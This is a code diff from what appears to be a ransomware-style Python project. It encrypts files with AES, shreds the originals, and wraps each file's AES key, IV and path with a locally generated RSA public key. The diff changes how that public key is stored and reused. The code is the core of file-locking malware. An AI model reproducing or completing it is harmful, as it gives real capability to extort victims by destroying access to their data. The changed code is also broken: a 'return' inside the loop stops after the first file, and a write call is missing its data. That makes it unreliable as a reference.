@@ -7,8 +7,8 @@ from core.config import (
     AES_SECRET_KEY_SIZE_IN_BYTES,
     AES_INITIALIZATION_VECTOR_SIZE_IN_BYTES,
     ENCRYPTED_FILE_EXTENSION,
-    LOCAL_PUBLIC_KEY,
     ENCRYPTED_AES_KEY_FILE_LOCATION,
+    LOCAL_RSA_PUBLIC_KEY_FILE_LOCATION
 )
 from core.utils.file_ops import read_data_from_file, write_data_to_file, shred_file
 from core.utils.generators import generate_rsa_key_pair
@@ -33,7 +33,7 @@ def encrypt_files(file_paths):
 
         shred_file(file_path)
 
-        yield {
+        return {
             "aes_secret_key": b64encode(aes_secret_key).decode("ascii"),
             "aes_initialization_vector": b64encode(aes_initialization_vector).decode(
                 "ascii"
@@ -44,33 +44,24 @@ def encrypt_files(file_paths):
         }
 
 
-def encrypt_file_details(
-    b64encoded_aes_secret_key, b64encoded_initialization_vector, b64encoded_file_path
-):
-    cipher = RSA(public_key=LOCAL_PUBLIC_KEY[0])
+def encrypt_file_details(cipher, b64encoded_aes_secret_key, b64encoded_initialization_vector, b64encoded_file_path):
     details = f"{b64encoded_aes_secret_key}\t{b64encoded_initialization_vector}\t{b64encoded_file_path}".encode()
     encrypted_data = cipher.encrypt_data(details)
     return encrypted_data
 
 
 def start_encryption(file_paths):
-    if not path.exists(ENCRYPTED_AES_KEY_FILE_LOCATION):
-        logger.info("Encryption started")
-        LOCAL_PUBLIC_KEY[0] = generate_rsa_key_pair()
-        list_of_file_identifiers = [detail for detail in encrypt_files(file_paths)]
-        encrypted_file_identifiers = [
-            encrypt_file_details(
-                file_identifier.get("aes_secret_key"),
-                file_identifier.get("aes_initialization_vector"),
-                file_identifier.get("encrypted_file_path"),
-            )
-            for file_identifier in list_of_file_identifiers
-        ]
-        write_data_to_file(
-            ENCRYPTED_AES_KEY_FILE_LOCATION,
-            encrypted_file_identifiers,
-            serialized=False,
-        )
+    if not path.exists(LOCAL_RSA_PUBLIC_KEY_FILE_LOCATION):
+        local_public_key = generate_rsa_key_pair()
+        write_data_to_file(LOCAL_RSA_PUBLIC_KEY_FILE_LOCATION)
     else:
-        logger.info("Encryption has already happened")
-
+        local_public_key = read_data_from_file(LOCAL_RSA_PUBLIC_KEY_FILE_LOCATION)
+    
+    logger.info("Encryption started")
+    cipher = RSA(public_key=local_public_key)
+    list_of_file_identifiers = [detail for detail in encrypt_files(file_paths)]
+    encrypted_file_identifiers = [
+        encrypt_file_details(cipher, file_identifier.get("aes_secret_key"), file_identifier.get("aes_initialization_vector"), file_identifier.get("encrypted_file_path"))
+        for file_identifier in list_of_file_identifiers
+    ]
+    write_data_to_file(ENCRYPTED_AES_KEY_FILE_LOCATION, encrypted_file_identifiers, serialized=False)
